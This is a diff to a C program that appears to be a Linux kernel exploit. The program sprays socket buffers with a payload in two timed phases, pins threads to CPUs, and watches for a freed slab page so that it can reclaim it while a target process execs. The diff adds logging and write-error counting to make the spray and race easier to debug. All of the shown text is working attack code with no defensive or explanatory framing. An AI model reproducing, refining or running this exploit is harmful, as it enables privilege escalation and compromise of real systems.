@@ -734,7 +734,7 @@ static int killer_fn(void *x)
 {
     int tid, tgid;
     (void)x;
-    pin(2);
+    pin(3);
     while (!(tid = atomic_load(&g_exec_tid)))
         sched_yield();
     tgid = atomic_load(&g_target_tgid);
@@ -2218,6 +2218,7 @@ static void ensure_pool(void)
     }
     if (!g_pool_n)
         park_forever("no spray sockets");
+    logf("[pool] n=%d\n", g_pool_n);
 }
 
 static void ensure_raw(void)
@@ -2314,30 +2315,54 @@ static int scan_page_alloc_foreign(const unsigned char *b, size_t n,
 static void *spray_thread(void *x)
 {
     struct spray_arg *a = x;
-    int w = 0;
+    int w = 0, wf = 0, wf_errno = 0;
 
     atomic_store(&g_spray_tids[a->idx], (int)syscall(SYS_gettid));
     pin(a->cpu);
+    logf("[spray_start] idx=%d tid=%d cpu=%d now=%d sock_first=%d sock_count=%d\n",
+         a->idx, (int)syscall(SYS_gettid), a->cpu, sched_getcpu(),
+         a->sock_first, a->sock_count);
+    if (a->sock_count <= 0)
+    {
+        logf("[spray_bad] idx=%d sock_count=%d\n", a->idx, a->sock_count);
+        return NULL;
+    }
     while (!atomic_load(&g_burst) && !atomic_load(&g_stop_spray))
         sched_yield();
-    /* Phase 1 runs before the target execs; it catches an early free. */
     while (!atomic_load(&g_stop_spray) && w < SPRAY_PRE)
     {
         int k = a->sock_first + (w % a->sock_count);
+        ssize_t r = write(g_pool[k][0], a->payload, SOCKBUF);
 
-        (void)write(g_pool[k][0], a->payload, SOCKBUF);
+        if (r < 0)
+        {
+            wf++;
+            if (!wf_errno)
+                wf_errno = errno;
+        }
         w++;
     }
-    /* Phase 2 is released when the parent sees the victim page free. */
+    logf("[phase1_done] idx=%d w=%d wf=%d errno=%d now=%d up=%ldms\n",
+         a->idx, w, wf, wf_errno, sched_getcpu(), now_ms());
     while (!atomic_load(&g_burst2) && !atomic_load(&g_stop_spray))
         sched_yield();
+    logf("[phase2_release] idx=%d w=%d now=%d up=%ldms\n",
+         a->idx, w, sched_getcpu(), now_ms());
     while (!atomic_load(&g_stop_spray) && w < SPRAY_PRE + SPRAY_POST)
     {
         int k = a->sock_first + (w % a->sock_count);
+        ssize_t r = write(g_pool[k][0], a->payload, SOCKBUF);
 
-        (void)write(g_pool[k][0], a->payload, SOCKBUF);
+        if (r < 0)
+        {
+            wf++;
+            if (!wf_errno)
+                wf_errno = errno;
+        }
         w++;
     }
+    logf("[phase2_done] idx=%d w=%d wf=%d errno=%d now=%d up=%ldms\n",
+         a->idx, w, wf, wf_errno, sched_getcpu(), now_ms());
     return NULL;
 }
 
@@ -2573,7 +2598,8 @@ static void run_plant(unsigned long long target, int tag, int mode,
             args[i].cpu = i;
             args[i].idx = i;
             atomic_store(&g_spray_tids[i], -1);
-            pthread_create(&th[i], NULL, spray_thread, &args[i]);
+            if (pthread_create(&th[i], NULL, spray_thread, &args[i]))
+                logf("[pthread_fail] idx=%d errno=%d\n", i, errno);
         }
     }
     /*
@@ -2651,7 +2677,8 @@ static void run_plant(unsigned long long target, int tag, int mode,
                      scan_page_free(raw, (size_t)m, slab_pfn))
             {
                 free_seen = 1;
-                logf("[free] pfn=%#llx up=%ldms\n", slab_pfn, now_ms());
+                logf("[free] pfn=%#llx cpu=%d up=%ldms\n", slab_pfn, cpu, now_ms());
+                logf("[burst2] pfn=%#llx cpu=%d up=%ldms\n", slab_pfn, cpu, now_ms());
                 atomic_store(&g_burst2, 1);
             }
         }
